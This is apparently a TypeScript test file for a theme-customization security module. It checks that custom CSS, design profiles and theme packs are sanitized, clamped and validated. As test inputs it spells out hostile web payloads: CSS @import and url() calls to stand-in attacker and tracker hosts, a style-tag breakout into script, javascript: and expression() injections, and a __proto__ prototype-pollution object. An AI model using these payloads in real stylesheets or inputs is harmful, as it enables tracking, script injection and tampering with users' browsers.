import assert from 'node:assert/strict';
import {
  sanitizeCustomCss,
  sanitizeDesignProfile,
  sanitizePartialDesignProfile,
  isSafeSurfaceColor,
  importThemePack,
  exportThemePack,
} from '../src/utils/designSecurity';
import { createDefaultDesignProfile } from '../src/utils/designDefaults';

// 1. Custom CSS sanitization strips exfiltration and active directives
const evilCss = `
  @import url("https://evil.example/leak.css");
  .nova-toolbar {
    background: url("https://tracker.example/pixel?c=1");
    color: #ff00aa;
    behavior: url(xss.htc);
  }
  </style><script>alert(1)</script>
`;
const cleaned = sanitizeCustomCss(evilCss);
assert.ok(!cleaned.css.includes('@import'), 'Must strip @import');
assert.ok(!cleaned.css.includes('https://'), 'Must strip external URLs');
assert.ok(!cleaned.css.includes('behavior:'), 'Must strip legacy behavior');
assert.ok(!cleaned.css.includes('</style'), 'Must strip closing style tag');
assert.ok(cleaned.css.includes('#ff00aa'), 'Must keep benign declarations');
assert.ok(cleaned.warnings.length >= 3, 'Must report stripped rules');

// 1b. Custom CSS edge cases: casing, whitespace, query parens, nested urls
const complexEvilCss = `
  .banner {
    background: URL(   'HTTPS://EVIL.EXAMPLE/LEAK?param=(1)'   );
    border-image: url(//cdn.tracker.example/img.png);
    mask: url("data:image/svg+xml;utf8,<svg onload=alert(1)>");
    cursor: url(javascript:alert(1));
    filter: expression(alert(1));
    nested: url(url("https://nested.evil.example"));
  }
`;
const complexCleaned = sanitizeCustomCss(complexEvilCss);
assert.ok(!complexCleaned.css.includes('HTTPS://'), 'Must strip uppercase HTTPS URL');
assert.ok(!complexCleaned.css.includes('//cdn.tracker.example'), 'Must strip protocol-relative URL');
assert.ok(!complexCleaned.css.includes('data:image'), 'Must strip data URL');
assert.ok(!complexCleaned.css.includes('javascript:'), 'Must strip javascript: URL');
assert.ok(!complexCleaned.css.includes('expression('), 'Must strip CSS expression()');
assert.ok(!complexCleaned.css.includes('nested.evil.example'), 'Must strip nested evil URL');

// 2. Clamping and prototype pollution rejection
const dirtyPayload = JSON.parse(
  '{"__proto__":{"polluted":true},"layout":{"sidebarWidth":9999,"chromeMode":"evil"},"surfaces":{"toolbar":{"opacity":0.01,"blur":900,"bg":"javascript:alert(1)"}},"typography":{"uiScale":5}}'
);
const sanitized = sanitizeDesignProfile(dirtyPayload);
assert.equal((Object.prototype as any).polluted, undefined, 'Prototype must not be polluted');
assert.equal(sanitized.layout.sidebarWidth, 360, 'Sidebar width must be clamped to 360');
assert.equal(sanitized.layout.chromeMode, 'classic-top', 'Invalid chromeMode must fallback');
assert.equal(sanitized.surfaces.toolbar?.opacity, 0.2, 'Opacity must clamp to min 0.2');
assert.equal(sanitized.surfaces.toolbar?.blur, 32, 'Blur must clamp to max 32');
assert.equal(sanitized.surfaces.toolbar?.bg, undefined, 'Unsafe surface color must be rejected');
assert.equal(sanitized.typography.uiScale, 1.25, 'UI scale must clamp to max 1.25');

// 2b. sanitizePartialDesignProfile keeps overrides sparse (does NOT backfill unspecified fields)
const sparseInput = {
  layout: {
    chromeMode: 'vertical-left',
  },
};
const sparseResult = sanitizePartialDesignProfile(sparseInput);
assert.equal(sparseResult.layout?.chromeMode, 'vertical-left');
assert.equal(sparseResult.layout?.sidebarWidth, undefined, 'Unspecified sidebarWidth must remain undefined');
assert.equal(sparseResult.layout?.toolbarItems, undefined, 'Unspecified toolbarItems must remain undefined');
assert.equal(sparseResult.layout?.sidebarSections, undefined, 'Unspecified sidebarSections must remain undefined');
assert.equal(sparseResult.meta, undefined, 'Unspecified meta must remain undefined');
assert.equal(sparseResult.surfaces, undefined, 'Unspecified surfaces must remain undefined');
assert.equal(sparseResult.typography, undefined, 'Unspecified typography must remain undefined');
assert.equal(sparseResult.density, undefined, 'Unspecified density must remain undefined');
assert.equal(sparseResult.effects, undefined, 'Unspecified effects must remain undefined');
assert.equal(sparseResult.newTabLayout, undefined, 'Unspecified newTabLayout must remain undefined');
assert.equal(sparseResult.customCss, undefined, 'Unspecified customCss must remain undefined');

// Another sparse test: only sidebarWidth specified
const widthOnlyInput = { layout: { sidebarWidth: 280 } };
const widthOnlyResult = sanitizePartialDesignProfile(widthOnlyInput);
assert.equal(widthOnlyResult.layout?.sidebarWidth, 280);
assert.equal(widthOnlyResult.layout?.chromeMode, undefined);
assert.equal(widthOnlyResult.layout?.toolbarItems, undefined);

// 2c. isSafeSurfaceColor validation
assert.equal(isSafeSurfaceColor('#fff'), true);
assert.equal(isSafeSurfaceColor('#123456'), true);
assert.equal(isSafeSurfaceColor('#12345678'), true);
assert.equal(isSafeSurfaceColor('rgb(255, 0, 0)'), true);
assert.equal(isSafeSurfaceColor('rgba(0, 0, 0, 0.5)'), true);
assert.equal(isSafeSurfaceColor('linear-gradient(to right, #000, #fff)'), true);
assert.equal(isSafeSurfaceColor('inherit'), true);
assert.equal(isSafeSurfaceColor('transparent'), true);
assert.equal(isSafeSurfaceColor('javascript:alert(1)'), false);
assert.equal(isSafeSurfaceColor('url("https://evil.com")'), false);
assert.equal(isSafeSurfaceColor('expression(alert(1))'), false);
assert.equal(isSafeSurfaceColor('<script>alert(1)</script>'), false);
assert.equal(isSafeSurfaceColor(null), false);
assert.equal(isSafeSurfaceColor(undefined), false);
assert.equal(isSafeSurfaceColor(123), false);

// 3. Export / import roundtrip and invalid pack rejection
const exported = exportThemePack(createDefaultDesignProfile());
const imported = importThemePack(exported);
assert.equal(imported.ok, true, 'Valid theme pack must import successfully');
if (imported.ok) {
  assert.equal(imported.profile.meta.name, 'Nova Default');
  assert.equal(imported.profile.layout.chromeMode, 'classic-top');
}

assert.equal(importThemePack('{"format":"other"}').ok, false, 'Invalid format must be rejected');
assert.equal(importThemePack('').ok, false, 'Empty pack must be rejected');
assert.equal(importThemePack('not valid json {').ok, false, 'Malformed json must be rejected');

// Reject pack exceeding 128 KB
const hugePack = JSON.stringify({
  format: 'nova-theme-pack',
  schemaVersion: 1,
  exportedAt: Date.now(),
  profile: {
    ...createDefaultDesignProfile(),
    customCss: { enabled: true, css: 'a'.repeat(150_000) },
  },
});
assert.equal(importThemePack(hugePack).ok, false, 'Packs exceeding 128KB must be rejected');

console.log('design_customization_security.test.ts passed');
